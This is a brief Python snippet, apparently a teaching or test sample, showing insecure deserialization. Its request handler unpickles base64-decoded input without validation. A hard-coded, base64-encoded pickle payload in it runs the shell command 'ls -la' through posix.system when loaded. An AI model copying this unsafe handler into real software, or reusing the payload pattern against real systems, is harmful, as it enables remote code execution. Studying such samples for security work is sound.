import pickle
import base64

def handle_request(req):
    objByte = base64.b64decode(req)
    obj = pickle.loads(objByte)
    print(obj)

handle_request('Y3Bvc2l4CnN5c3RlbQpwMAooUydscyAtbGEnCnAxCnRwMgpScDMKLg==')